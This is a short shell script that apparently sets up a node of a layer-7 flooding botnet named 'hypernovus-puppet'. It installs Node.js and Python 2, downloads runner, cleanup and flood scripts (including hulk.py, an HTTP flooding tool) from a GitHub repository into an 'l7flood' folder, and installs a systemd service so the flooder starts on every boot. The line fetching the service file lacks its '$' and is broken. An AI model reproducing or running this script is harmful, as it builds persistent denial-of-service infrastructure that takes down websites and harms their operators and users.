#!/bin/sh

JSURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/index.js
JSTEST=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/indextest.js

PYURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hulk.py

RUNNERURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/runl7.sh
CLEANUPURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/cleanupl7.sh
SERVICEURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hyperl7.service

apt -y update
apt -y upgrade
apt -y install npm
apt -y install nodejs
apt -y install python2

wget $RUNNERURL
chmod +x runl7.sh

wget $CLEANUPURL
chmod +x cleanupl7.sh

mkdir l7flood
cd l7flood

npm install delay
npm install express
npm install axios
npm install fs
npm install http

wget $JSURL
wget $PYURL
wget $JSTEST

cd /lib/systemd/system

wget SERVICEURL
systemctl daemon-reload
systemctl start hyperl7
systemctl enable hyperl7




